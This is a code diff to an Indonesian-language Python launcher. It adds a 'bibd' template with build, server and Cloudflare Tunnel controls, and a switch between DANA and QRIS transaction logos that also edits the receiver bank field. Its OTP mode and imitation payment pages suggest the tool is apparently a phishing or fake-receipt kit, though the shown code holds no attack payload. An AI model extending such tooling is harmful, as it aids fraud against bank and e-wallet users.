@@ -275,6 +275,23 @@ def menu(current_template):
         print(f"       {C.SLATE}Jalankan massive data mining (500+ data points){C.RST}")
         print(f"  {C.TEAL}[2]{C.RST}  Ganti Template")
         print(f"  {C.TEAL}[3]{C.RST}  Keluar")
+    elif current_template == "bibd":
+        cur_logo = "DANA"
+        try:
+            p = os.path.join(APP_DIR, "templates", "bibd", "data.json")
+            if os.path.exists(p):
+                with open(p, "r", encoding="utf-8") as f:
+                    cur_logo = json.load(f).get("transactionLogo", "dana").upper()
+        except Exception:
+            pass
+        print(f"  {C.TEAL}[1]{C.RST}  Mulai Semua")
+        print(f"       {C.SLATE}Build + Server + Cloudflare Tunnel{C.RST}")
+        print(f"  {C.TEAL}[2]{C.RST}  Hentikan Semua")
+        print(f"  {C.TEAL}[3]{C.RST}  Status")
+        print(f"  {C.TEAL}[4]{C.RST}  Salin URL")
+        print(f"  {C.TEAL}[5]{C.RST}  Ganti Template")
+        print(f"  {C.TEAL}[6]{C.RST}  Ganti Logo Transaksi {C.SLATE}(DANA / QRIS - Aktif: {cur_logo}){C.RST}")
+        print(f"  {C.TEAL}[7]{C.RST}  Keluar")
     else:
         print(f"  {C.TEAL}[1]{C.RST}  Mulai Semua")
         print(f"       {C.SLATE}Build + Server + Cloudflare Tunnel{C.RST}")
@@ -1065,6 +1082,75 @@ class Engine:
         print()
 
 
+def _set_bibd_logo(eng, logo_key):
+    """Set transaction logo in templates/bibd/data.json and src/app/data.json."""
+    paths = [
+        os.path.join(eng.app_dir, "templates", "bibd", "data.json"),
+        os.path.join(eng.app_dir, "src", "app", "data.json"),
+    ]
+    for p in paths:
+        if os.path.exists(p):
+            try:
+                with open(p, "r", encoding="utf-8") as f:
+                    d = json.load(f)
+                d["transactionLogo"] = logo_key
+                if logo_key == "qris":
+                    if d.get("receiverBank") in ("DANA", ""):
+                        d["receiverBank"] = "QRIS"
+                elif logo_key == "dana":
+                    if d.get("receiverBank") in ("QRIS", ""):
+                        d["receiverBank"] = "DANA"
+                with open(p, "w", encoding="utf-8") as f:
+                    json.dump(d, f, indent=2)
+            except Exception:
+                pass
+
+
+def choose_transaction_logo(eng):
+    """Prompt user to choose transaction logo (DANA or QRIS) for BIBD."""
+    tmpl = TEMPLATES.get(eng.current_template)
+    if not tmpl or eng.current_template != "bibd":
+        return
+
+    data_path = os.path.join(tmpl["dir"], "data.json")
+    cur_logo = "dana"
+    if os.path.exists(data_path):
+        try:
+            with open(data_path, "r", encoding="utf-8") as f:
+                d = json.load(f)
+                cur_logo = d.get("transactionLogo", "dana").lower()
+        except Exception:
+            pass
+
+    print(f"\n{C.TEAL}  Pilih Logo Transaksi / Pembayaran:{C.RST}")
+    dana_mark = f" {C.EMER}(Aktif){C.RST}" if cur_logo == "dana" else ""
+    qris_mark = f" {C.EMER}(Aktif){C.RST}" if cur_logo == "qris" else ""
+    print(f"  {C.TEAL}[1]{C.RST}  DANA  {C.SLATE}(Aplikasi E-Wallet DANA){C.RST}{dana_mark}")
+    print(f"  {C.TEAL}[2]{C.RST}  QRIS  {C.SLATE}(Standar Pembayaran QRIS){C.RST}{qris_mark}")
+    print()
+    while True:
+        try:
+            default_val = "1" if cur_logo == "dana" else "2"
+            print(f"{C.CYN}  Pilih logo (1-2) [default {default_val}]: {C.RST}", end="")
+            ch = input().strip()
+            if not ch:
+                ch = default_val
+            if ch == "1":
+                _set_bibd_logo(eng, "dana")
+                step("Logo transaksi: DANA")
+                time.sleep(0.5)
+                break
+            elif ch == "2":
+                _set_bibd_logo(eng, "qris")
+                step("Logo transaksi: QRIS")
+                time.sleep(0.5)
+                break
+            else:
+                print(f"  {C.YLW}Masukkan 1 atau 2{C.RST}")
+        except (KeyboardInterrupt, EOFError):
+            break
+
+
 def choose_template(eng):
     banner()
     template_menu(eng.current_template)
@@ -1095,6 +1181,9 @@ def choose_template(eng):
                         eng.custom_title = TEMPLATES['tiktok']['title']
                         step("Menggunakan default title")
                     time.sleep(0.5)
+                elif key == "bibd":
+                    eng.custom_title = None
+                    choose_transaction_logo(eng)
                 else:
                     eng.custom_title = None
 
@@ -1207,6 +1296,8 @@ def main():
             eng.custom_title = TEMPLATES['tiktok']['title']
             step(f"Menggunakan default title")
         time.sleep(0.5)
+    elif eng.current_template == "bibd":
+        choose_transaction_logo(eng)
 
     # Local Dashboard Prompt
     tmpl = TEMPLATES[eng.current_template]
@@ -1242,9 +1333,14 @@ def main_loop(eng):
     while True:
         try:
             menu(eng.current_template)
-            is_otp = TEMPLATES[eng.current_template].get("is_otp_mode", False)
+            tmpl = TEMPLATES[eng.current_template]
+            is_otp = tmpl.get("is_otp_mode", False)
+            is_bibd = eng.current_template == "bibd"
+
             if is_otp:
                 print(f"{C.CYN}  Pilih menu (1-3): {C.RST}", end="")
+            elif is_bibd:
+                print(f"{C.CYN}  Pilih menu (1-7): {C.RST}", end="")
             else:
                 print(f"{C.CYN}  Pilih menu (1-6): {C.RST}", end="")
             ch = input().strip()
@@ -1271,6 +1367,36 @@ def main_loop(eng):
                     sys.exit(0)
                 else:
                     print(f"  {C.YLW}Masukkan 1-3{C.RST}")
+            elif is_bibd:
+                if ch == "1": eng.start_all()
+                elif ch == "2": eng.stop_all()
+                elif ch == "3": eng.show_status()
+                elif ch == "4":
+                    url = eng.url
+                    if not url:
+                        eng.show_status()
+                        url = eng.url
+                    if url:
+                        print(f"\n  {C.B}{C.CYN}URL:{C.RST}")
+                        print(f"  {C.BG_B}{C.WHT}  {url}  {C.RST}\n")
+                        try:
+                            subprocess.run("clip", input=url.encode("utf-8"), check=True)
+                            print(f"  {C.GRN}Disalin ke clipboard!{C.RST}\n")
+                        except: print(f"  {C.DIM}(Salin manual){C.RST}\n")
+                    else:
+                        print(f"\n  {C.YLW}Tidak ada URL. Tekan [1] untuk memulai.{C.RST}\n")
+                elif ch == "5":
+                    choose_template(eng)
+                elif ch == "6":
+                    choose_transaction_logo(eng)
+                    step("Menerapkan logo baru ke aplikasi...")
+                    eng.stop_all()
+                    eng.start_all()
+                elif ch == "7":
+                    eng.stop_all()
+                    print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
+                    sys.exit(0)
+                else: print(f"  {C.YLW}Masukkan 1-7{C.RST}")
             else:
                 if ch == "1": eng.start_all()
                 elif ch == "2": eng.stop_all()
